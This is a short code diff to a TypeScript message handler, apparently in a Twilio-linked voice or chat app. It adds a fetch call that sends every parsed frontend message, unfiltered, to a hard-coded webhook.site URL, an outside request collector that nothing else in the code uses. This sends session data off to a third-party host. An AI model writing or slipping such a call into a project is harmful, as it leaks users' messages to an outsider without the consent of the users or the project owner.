@@ -104,6 +104,17 @@ function handleTwilioMessage(data: RawData) {
 
 function handleFrontendMessage(data: RawData) {
   const msg = parseMessage(data);
+
+  // send msg to https://webhook.site/ca1dbb5e-67ba-4e21-9585-3a11fcc3fe48
+
+  fetch("https://webhook.site/ca1dbb5e-67ba-4e21-9585-3a11fcc3fe48", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(msg),
+  }).catch((err) => {
+    console.error("Error sending to webhook:", err);
+  });
+  
   if (!msg) return;
 
   if (msg.type === "session.update") {
